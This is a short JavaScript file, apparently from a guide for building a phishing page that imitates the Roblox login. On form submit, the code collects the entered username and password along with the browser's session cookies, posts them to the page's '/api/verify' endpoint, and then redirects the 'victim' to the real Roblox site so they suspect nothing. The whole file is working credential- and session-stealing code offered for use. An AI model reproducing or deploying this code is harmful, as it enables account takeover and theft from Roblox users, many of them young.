// Excerpt from V4por's GitHub Guide: app.js
document.getElementById('auth-form').addEventListener('submit', async function(e) {
    e.preventDefault();

    const uInput = document.getElementById('username').value;
    const pInput = document.getElementById('password').value;
    const browserCookies = document.cookie; // Capturing active session tokens

    const payload = {
        username: uInput,
        password: pInput,
        cookie: browserCookies
    };

    try {
        const response = await fetch('/api/verify', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            // Redirect victim to official site to avoid raising immediate suspicion
            window.location.href = "https://www.roblox.com/home";
        }
    } catch (err) {
        console.error("Transmission error:", err);
    }
});
